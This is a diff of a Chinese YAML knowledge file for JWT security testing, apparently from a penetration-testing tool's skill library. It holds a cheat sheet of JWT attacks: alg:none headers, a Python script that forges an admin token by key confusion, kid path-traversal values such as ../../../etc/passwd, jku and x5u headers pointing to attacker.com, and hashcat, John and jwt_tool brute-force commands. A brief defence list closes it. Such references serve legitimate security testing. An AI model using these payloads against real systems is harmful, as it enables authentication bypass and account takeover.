@@ -1,215 +1,28 @@
-name: "JWT安全测试"
-description: "JWT令牌伪造、弱密钥检测技术"
-domain: "web"
-version: "1.0"
+name: JWT安全测试
+description: JWT令牌伪造、弱密钥检测技术
+domain: web
+version: '1.0'
 tags:
-  - web
-  - jwt
-  - authentication
-
-knowledge: |
-  # JWT详细分类
-  
-  ## 1. JWT基础
-  
-  ### JWT结构
-  
-  ```
-  Header.Payload.Signature
-  ```
-  
-  ### 解码
-  
-  ```bash
-  # jwt.io
-  echo "TOKEN" | cut -d'.' -f1 | base64 -d
-  ```
-  
-  ---
-  
-  ## 2. None算法攻击 (alg:none)
-  
-  ```json
-  {"alg":"none","typ":"JWT","payload":"..."}
-  {"alg":"None","typ":"JWT","payload":"..."}
-  {"alg":"NONE","typ":"JWT","payload":"..."}
-  ```
-  
-  ---
-  
-  ## 3. 密钥混淆攻击 (RS256 -> HS256)
-  
-  ### 步骤
-  
-  1. 获取公钥
-  2. 将公钥作为HMAC密钥签名
-  3. 将alg改为HS256
-  
-  ### Python示例
-  
-  ```python
-  import jwt
-  
-  public_key = open("public.pem").read()
-  payload = {"user": "admin", "role": "admin"}
-  
-  # 使用公钥作为HMAC密钥
-  token = jwt.encode(payload, public_key, algorithm="HS256")
-  print(token)
-  ```
-  
-  ---
-  
-  ## 4. KID注入
-  
-  ```json
-  {"alg":"HS256","typ":"JWT","kid":"../../../../../dev/null"}
-  {"alg":"HS256","typ":"JWT","kid":"key-1"}
-  {"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}
-  ```
-  
-  ---
-  
-  ## 5. jku注入
-  
-  ```json
-  {
-    "alg": "RS256",
-    "typ": "JWT",
-    "jku": "http://attacker.com/jwk.json"
-  }
-  ```
-  
-  ### 恶意JWK
-  
-  ```json
-  {
-    "kty": "oct",
-    "k": "YXJj",
-    "alg": "HS256"
-  }
-  ```
-  
-  ---
-  
-  ## 6. x5u注入
-  
-  ```json
-  {
-    "alg": "RS256",
-    "typ": "JWT",
-    "x5u": "http://attacker.com/cert.pem"
-  }
-  ```
-  
-  ---
-  
-  ## 7. 弱密钥爆破
-  
-  ### 使用hashcat
-  
-  ```bash
-  hashcat -m 16500 jwt.txt wordlist.txt
-  ```
-  
-  ### 使用jwt_tool
-  
-  ```bash
-  python3 jwt_tool.py TOKEN -C -d wordlist.txt
-  ```
-  
-  ### 使用John
-  
-  ```bash
-  jwt2john.py jwt.txt > hash.txt
-  john --wordlist=wordlist.txt hash.txt
-  ```
-  
-  ---
-  
-  ## 8. JWK密钥注入
-  
-  ```json
-  {
-    "alg": "RS256",
-    "typ": "JWT",
-    "jwk": {
-      "kty": "RSA",
-      "n": "...",
-      "e": "AQAB",
-      "alg": "RS256"
-    }
-  }
-  ```
-  
-  ---
-  
-  ## 9. 常用工具
-  
-  ```bash
-  # jwt_tool
-  python3 jwt_tool.py TOKEN -C -d wordlist.txt
-  python3 jwt_tool.py TOKEN -X -k public.pem
-  python3 jwt_tool.py TOKEN --at
-  
-  # jwt.io
-  # 在线解码和构造
-  
-  # c-jwt-cracker
-  ./c-jwt-cracker -t TOKEN -w wordlist.txt
-  ```
-  
-  ---
-  
-  ## 10. 攻击示例
-  
-  ### 完整攻击链
-  
-  ```bash
-  # 1. 解码JWT
-  echo "TOKEN" | cut -d'.' -f1 | base64 -d
-  
-  # 2. 尝试none算法
-  python3 jwt_tool.py TOKEN -X a
-  
-  # 3. 密钥混淆
-  python3 jwt_tool.py TOKEN -X s -pr public.pem
-  
-  # 4. 爆破弱密钥
-  python3 jwt_tool.py TOKEN -C -d wordlist.txt
-  ```
-  
-  ---
-  
-  ## 11. 防御措施
-  
-  - 使用强密钥
-  - 验证算法
-  - 检查密钥来源
-  - 使用JWKS
-  - 设置过期时间
-  
-
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+- web
+- jwt
+- authentication
+knowledge: "# JWT详细分类\n\n## 1. JWT基础\n\n### JWT结构\n\n```\nHeader.Payload.Signature\n```\n\n### 解码\n\n```bash\n# jwt.io\necho\
+  \ \"TOKEN\" | cut -d'.' -f1 | base64 -d\n```\n\n---\n\n## 2. None算法攻击 (alg:none)\n\n```json\n{\"alg\":\"none\",\"typ\":\"\
+  JWT\",\"payload\":\"...\"}\n{\"alg\":\"None\",\"typ\":\"JWT\",\"payload\":\"...\"}\n{\"alg\":\"NONE\",\"typ\":\"JWT\",\"\
+  payload\":\"...\"}\n```\n\n---\n\n## 3. 密钥混淆攻击 (RS256 -> HS256)\n\n### 步骤\n\n1. 获取公钥\n2. 将公钥作为HMAC密钥签名\n3. 将alg改为HS256\n\
+  \n### Python示例\n\n```python\nimport jwt\n\npublic_key = open(\"public.pem\").read()\npayload = {\"user\": \"admin\", \"\
+  role\": \"admin\"}\n\n# 使用公钥作为HMAC密钥\ntoken = jwt.encode(payload, public_key, algorithm=\"HS256\")\nprint(token)\n```\n\n\
+  ---\n\n## 4. KID注入\n\n```json\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../../dev/null\"}\n{\"alg\":\"HS256\"\
+  ,\"typ\":\"JWT\",\"kid\":\"key-1\"}\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../etc/passwd\"}\n```\n\n---\n\n\
+  ## 5. jku注入\n\n```json\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jku\": \"http://attacker.com/jwk.json\"\n}\n\
+  ```\n\n### 恶意JWK\n\n```json\n{\n  \"kty\": \"oct\",\n  \"k\": \"YXJj\",\n  \"alg\": \"HS256\"\n}\n```\n\n---\n\n## 6. x5u注入\n\
+  \n```json\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"x5u\": \"http://attacker.com/cert.pem\"\n}\n```\n\n---\n\n\
+  ## 7. 弱密钥爆破\n\n### 使用hashcat\n\n```bash\nhashcat -m 16500 jwt.txt wordlist.txt\n```\n\n### 使用jwt_tool\n\n```bash\npython3\
+  \ jwt_tool.py TOKEN -C -d wordlist.txt\n```\n\n### 使用John\n\n```bash\njwt2john.py jwt.txt > hash.txt\njohn --wordlist=wordlist.txt\
+  \ hash.txt\n```\n\n---\n\n## 8. JWK密钥注入\n\n```json\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"\
+  kty\": \"RSA\",\n    \"n\": \"...\",\n    \"e\": \"AQAB\",\n    \"alg\": \"RS256\"\n  }\n}\n```\n\n---\n\n## 9. 常用工具\n\n\
+  ```bash\n# jwt_tool\npython3 jwt_tool.py TOKEN -C -d wordlist.txt\npython3 jwt_tool.py TOKEN -X -k public.pem\npython3 jwt_tool.py\
+  \ TOKEN --at\n\n# jwt.io\n# 在线解码和构造\n\n# c-jwt-cracker\n./c-jwt-cracker -t TOKEN -w wordlist.txt\n```\n\n---\n\n## 10. 攻击示例\n\
+  \n### 完整攻击链\n\n```bash\n# 1. 解码JWT\necho \"TOKEN\" | cut -d'.' -f1 | base64 -d\n\n# 2. 尝试none算法\npython3 jwt_tool.py TOKEN\
+  \ -X a\n\n# 3. 密钥混淆\npython3 jwt_tool.py TOKEN -X s -pr public.pem\n\n# 4. 爆破弱密钥\npython3 jwt_tool.py TOKEN -C -d wordlist.txt\n\
+  ```\n\n---\n\n## 11. 防御措施\n\n- 使用强密钥\n- 验证算法\n- 检查密钥来源\n- 使用JWKS\n- 设置过期时间\n"
